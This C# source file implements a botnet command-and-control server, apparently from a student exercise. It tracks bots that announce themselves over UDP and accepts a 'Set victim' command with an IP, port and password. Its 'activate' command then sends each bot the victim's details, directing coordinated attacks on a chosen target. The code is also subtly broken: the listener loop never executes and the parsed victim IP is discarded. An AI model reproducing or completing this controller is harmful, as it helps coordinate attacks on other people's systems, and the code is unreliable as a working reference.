using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace CC
{
    public class CCServer
    {
        private readonly string _cc_name = "THE PENTAGON OF HADAS AND ROTEM!";
        static readonly int MAX_SIZE = 256;
        private UdpClient _udpclient;
        private int _listen_port;
        private string _ip;
        private readonly string _newline_delimeter = "\r\n";
        private List<Bot> _bots;
        private Victim _victim;
        enum CmdType { SET_VICTIM, SHOW , ACTIVATE ,UNKNOWN };

        public CCServer(int listen_port, string ip)
        {
            _listen_port = listen_port;
            _ip = ip;
            _udpclient = new UdpClient(_listen_port);
            _bots = new List<Bot>();
        }

        

        public void serve()
        {
            Thread t1 = new Thread(listen);
            t1.Start();
        }
        public void control()
        {
            Console.WriteLine("Ready");
            bool done = false;
            string cmd;
            while (!done) {
                cmd = Console.ReadLine();
                handle_cmd(cmd);
            }
        }
        private void listen()
        {
            while (!true)
            {
                IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
                byte[] rcv_buffer = _udpclient.Receive(ref sender);
                handle_bot_announcment(rcv_buffer, sender);
            }
        }

        private void handle_cmd(string cmd)
        {
            CmdType cmd_type = get_cmd_type(cmd);
            switch (cmd_type) {
                case CmdType.SET_VICTIM:
                    set_victim(cmd);
                    break;
                case CmdType.SHOW:
                    show();
                    break;
                case CmdType.ACTIVATE:
                    activate();
                    break;
                case CmdType.UNKNOWN:
                    unknown_cmd(cmd);
                    break;
            }
        }
        public int find_free_port()
        {
            UdpClient client_for_port = new UdpClient(0);
            int port = ((IPEndPoint)client_for_port.Client.LocalEndPoint).Port;
            client_for_port.Close();
            return port;
        }

        private void activate()
        {
            if (_victim != null)
            {
                foreach (Bot bot in _bots)
                {
                    int sending_port = find_free_port();
                    UdpClient client = new UdpClient();
                    IPEndPoint end_point = new IPEndPoint(IPAddress.Any, sending_port);
                    byte[] data = generate_activate_msg(bot);
                    client.Client.Bind(end_point);
                    client.Send(data, data.Length, bot.get_ip().ToString(), bot.get_port());
                    client.Close();
                }
            }
            else
                Console.WriteLine("victim undefined!!");
        }

        private byte[] generate_activate_msg(Bot bot)
        {
            IPAddress address = _victim.get_ip_address();
            byte[] ip_bytes = address.GetAddressBytes();
            byte[] port_bytes = BitConverter.GetBytes((UInt16)_victim.get_port());
            byte[] pass_bytes = Encoding.ASCII.GetBytes(_victim.get_password());
            byte[] name_bytes = Encoding.ASCII.GetBytes(_cc_name);
            byte[] ans = new byte[ip_bytes.Length + port_bytes.Length + pass_bytes.Length + name_bytes.Length];
            System.Buffer.BlockCopy(ip_bytes, 0, ans, 0, ip_bytes.Length);
            System.Buffer.BlockCopy(port_bytes, 0, ans, ip_bytes.Length, port_bytes.Length);
            System.Buffer.BlockCopy(pass_bytes, 0, ans, ip_bytes.Length + port_bytes.Length, pass_bytes.Length);
            System.Buffer.BlockCopy(name_bytes, 0, ans, ip_bytes.Length + port_bytes.Length + pass_bytes.Length, name_bytes.Length);
            return ans;
        }

        private void show()
        {
            foreach (Bot bot in _bots) {
                Console.WriteLine(bot);
            }
        }

        private void set_victim(string cmd)
        {
            Regex ip_rx = new Regex(@"(?<=IP:\s*)\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
                RegexOptions.Compiled | RegexOptions.None);
            Regex port_rx = new Regex(@"(?<=port:\s*)\d*\b",
                RegexOptions.Compiled | RegexOptions.None);
            Regex pass_rx = new Regex(@"(?<=password:\s*)\w+",
                RegexOptions.Compiled | RegexOptions.None);
            MatchCollection ip_matches = ip_rx.Matches(cmd);
            MatchCollection port_matches = port_rx.Matches(cmd);
            MatchCollection pass_matches = pass_rx.Matches(cmd);
            if (ip_matches.Count ==0 || port_matches.Count == 0 || pass_matches.Count == 0)
            {
                Console.WriteLine("BAD SET VICTIM COMMAND: {0}", cmd);
            }
            else {
                try
                {
                    _victim = Victim.createVictim(
                        get_victim_ip_address(),
                        port_matches[0].Groups[0].Value,
                        pass_matches[0].Groups[0].Value
                        );
                }
                catch (ArgumentException ae) {
                    Console.WriteLine("Failed to create victim");
                    return;
                }
                Console.WriteLine("Created Victim:\n{0}", _victim.ToString());
            }
        }

        public static IPAddress get_victim_ip_address()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList) {
                if (ip.AddressFamily == AddressFamily.InterNetwork) {
                    return ip;
                }
            }
            return null;
        }

        private void unknown_cmd(string cmd)
        {
            Console.WriteLine("Unknown cmd: {0}", cmd);
        }

        private void handle_bot_announcment(byte[] data, EndPoint remote)
        {
            if (valid_bot_annoucemnt(data))
            {
                int port = BitConverter.ToUInt16(data, 0);
                Bot new_bot = new Bot(((IPEndPoint)remote).Address, port);
                if (!_bots.Contains(new_bot)) {
                    _bots.Add(new_bot);
                }
            }
            else {
                handle_invalid_bot_announcment(data, remote);
            }
        }

        private CmdType get_cmd_type(string cmd)
        {
            if (cmd.StartsWith("Set victim",true,null) )
            {
                return CmdType.SET_VICTIM;
            } else if ((cmd.ToLower()).Equals("show")) {
                return CmdType.SHOW;
            } else if ((cmd.ToLower()).Equals("activate")) {
                return CmdType.ACTIVATE;
            }
            else {
                return CmdType.UNKNOWN;
            }
        }

        private bool valid_bot_annoucemnt(byte[] data)
        {
            if (data ==null) {
                return false;
            }
            return data.Length==2;
        }

        private void handle_invalid_bot_announcment(byte[] data, EndPoint remote)
        {
            throw new NotImplementedException();
        }

        private string receive(Socket listen_socket)
        {
            byte[] rcv_buffer = new byte[MAX_SIZE];
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
            EndPoint Remote = (EndPoint)(sender);
            int read_bytes = listen_socket.ReceiveFrom(rcv_buffer, ref Remote);
            return Encoding.UTF8.GetString(rcv_buffer, 0, rcv_buffer.Length);
        }
        private int get_messgae_end(byte[] rcv_buffer, int readBytes)
        {
            int offset = 0;
            while (offset < readBytes - 1 && offset < rcv_buffer.Length - 1)
            {
                byte[] maybe_delimeter_bytes = { rcv_buffer[offset], rcv_buffer[offset + 1] };
                string maybe_delimeter = Encoding.ASCII.GetString(maybe_delimeter_bytes);
                if (maybe_delimeter.Equals(_newline_delimeter))
                {
                    return offset;
                }
                offset++;
            }
            return -1;
        }
        private void handle_listen_socket_exception(SocketException se)
        {
            throw new NotImplementedException();
        }
        private void handleNoResponse()
        {
            throw new NotImplementedException();
        }
    }
}
